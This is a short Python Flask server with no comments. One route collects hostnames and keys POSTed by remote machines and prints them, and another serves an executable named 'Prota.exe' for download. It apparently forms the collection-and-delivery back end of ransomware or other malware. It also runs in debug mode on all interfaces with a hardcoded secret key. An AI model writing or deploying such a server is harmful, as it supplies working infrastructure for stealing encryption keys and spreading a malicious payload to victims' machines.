from flask import Flask, request, redirect, jsonify, send_file
import json

app = Flask(__name__)
app.secret_key = "secret key"

@app.route('/', methods=['POST'])
def recvkey ():
    resp = jsonify({})
    headers = request.headers
    jsons = json.loads(request.data)

    if (jsons == None):
        resp.status_code = 404
        return resp

    try:
        print('hostname: {hostname}\nkey: {key}'.format(hostname=jsons['hostname'], key=jsons['key']))
    except Exception as e:
        print(e)
        resp.status_code = 404
        return resp

    resp.status_code = 200
    return resp
@app.route('/download', methods=['GET'])
def download ():
    resp = jsonify({})
    return send_file('Prota.exe')


if __name__ == "__main__":
    app.run(host="0.0.0.0", port="12345", debug=True, use_reloader=True)

